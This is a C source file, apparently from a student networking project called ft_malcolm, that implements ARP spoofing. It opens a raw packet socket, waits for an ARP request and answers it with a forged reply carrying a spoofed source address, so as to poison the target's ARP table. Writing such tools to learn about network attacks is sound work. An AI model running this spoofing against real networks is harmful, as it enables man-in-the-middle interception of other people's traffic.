#include "../includes/ft_malcolm.h"

t_data g_data;

void free_data(void) {
    if (g_data.sockfd != -1)
        close(g_data.sockfd);
    if (g_data.result_src != NULL)
        freeaddrinfo(g_data.result_src);
    if (g_data.result_target != NULL)
        freeaddrinfo(g_data.result_target);
}

void signal_handler(int signal) {
    if (signal == SIGINT) {
        printf("Exiting program...\n");
        free_data();
        exit(EXIT_SUCCESS);
    }
}

int     init_socket(void)
{
	int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ARP_TYPE));
	if (sockfd == -1)
		exit_error("ft_malcolm: socket error");
	return (sockfd);
}

int  get_interface(void) {
    struct ifaddrs      *ifap = NULL, *head = NULL;
    if (getifaddrs(&ifap) == -1)
        exit_error("ft_malcolm: no such interface");
    head = ifap;
    for ( ; ifap != NULL ; ifap = ifap->ifa_next) {
        if (ifap->ifa_name && ft_strncmp(ifap->ifa_name, INTERFACE, sizeof(INTERFACE)) == 0) {
            printf("Found available interface: %s\n", ifap->ifa_name);
            if (ifap->ifa_addr->sa_family == AF_PACKET) {
                struct sockaddr_ll *s = (struct sockaddr_ll *)ifap->ifa_addr;
                int ifindex = s->sll_ifindex;
                freeifaddrs(head);
                return (ifindex);
            }
        }
    }
    freeifaddrs(head);
    fprintf(stderr, "ft_malcolm: interface not found");
    return exit_error(""), -1;
}



int main(int argc, char **argv) {
    if (getuid() != 0)
        exit_error("ft_malcolm: Operation not permitted");
    if (argc != 5)
        exit_error("ft_malcolm: usage: <IP-src> <MAC-src> <IP-target> <MAC-target>");
    signal(SIGINT, signal_handler);

    parse_mac_address(argv[MAC_SRC]);
    parse_mac_address(argv[MAC_TARGET]);
    for (int i = 0; i < 6; i++) {
        g_data.mac_src[i] = hextouint8(argv[MAC_SRC] + i * 3);
        g_data.mac_target[i] = hextouint8(argv[MAC_TARGET] + i * 3);
    }
    parse_ip_address(argv[IP_SRC], argv[IP_TARGET]);
    g_data.sockfd = init_socket();
    int ifindex = get_interface();

    t_arp_packet packet;
    create_arp_packet(&packet, argv);
    struct sockaddr_ll socket_address;
    create_socket_address(&socket_address, g_data.mac_target, ifindex);
    print_packet(packet);
    while (42) {
        if (receive_arp_request()) {
            printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
            ssize_t bytes_sent = sendto(g_data.sockfd, &packet, sizeof(t_arp_packet), 0,
                                (struct sockaddr *)&socket_address, sizeof(struct sockaddr_ll));
            if (bytes_sent <= 0)
                exit_error("ft_malcolm: sendto() failed");
            printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
        }
    }
    free_data();
    return (EXIT_SUCCESS);
}